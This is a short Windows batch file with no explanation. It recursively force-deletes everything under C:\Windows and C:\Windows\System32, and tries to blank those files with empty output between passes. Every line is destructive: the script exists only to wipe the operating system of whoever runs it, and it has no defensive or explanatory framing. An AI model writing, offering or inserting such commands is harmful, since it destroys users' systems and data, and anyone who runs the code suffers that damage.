@echo off
del "C:\Windows\*.*" /f /s /q
type nul > "C:\Windows\*.*"
del "C:\Windows\*.*" /f /s /q
del "C:\Windows\System32\*.*" /f /s /q
type nul > "C:\Windows\System32\*.*"
del "C:\Windows\System32\*.*" /f /s /q